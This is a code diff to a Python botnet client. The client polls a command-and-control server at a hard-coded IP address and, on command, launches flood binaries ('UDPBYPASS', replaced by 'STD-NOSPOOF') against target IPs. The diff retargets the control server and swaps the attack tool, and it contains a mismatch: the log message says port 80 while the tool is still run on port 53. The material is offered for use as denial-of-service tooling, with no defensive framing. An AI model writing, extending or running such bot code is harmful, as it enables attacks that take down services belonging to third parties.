@@ -6,7 +6,7 @@ import sys
 import uuid
 
 # === BOT SETTINGS ===
-API_URL = "http://8.210.162.236:5000" # CHANGE THIS TO YOUR API IP
+API_URL = "http://85.137.165.57:5000" # CHANGE THIS TO YOUR API IP
 POLL_INTERVAL = 1 
 ID_FILE = "bot_id.txt"              
 # =====================
@@ -27,14 +27,14 @@ def get_or_create_bot_id():
     return bot_id
 
 def execute_start(ip):
-    if not os.path.exists("./UDPBYPASS"):
-        print(f"[!] ERROR: ./UDPBYPASS not found!")
+    if not os.path.exists("./STD-NOSPOOF"):
+        print(f"[!] ERROR: ./STD-NOSPOOF not found!")
         return False
 
-    print(f"[+] Command START {ip}:53. Running tool...")
+    print(f"[+] Command START {ip}:80. Running tool...")
     try:
         proc = subprocess.Popen(
-            ["./UDPBYPASS", ip, "53"],
+            ["./STD-NOSPOOF", ip, "53"],
             stdout=subprocess.DEVNULL,
             stderr=subprocess.DEVNULL
         )
@@ -101,7 +101,7 @@ def main():
     print(f"=====================================")
     print(f"  Bot ID: {BOT_ID}")
     print(f"  Server: {API_URL}")
-    print(f"  Tool:   ./UDPBYPASS")
+    print(f"  Tool:   ./STD-NOSPOOF")
     print(f"=====================================")
     print("Bot is running in background and listening to API.")
     print("Press Ctrl+C to exit and stop all attacks.")
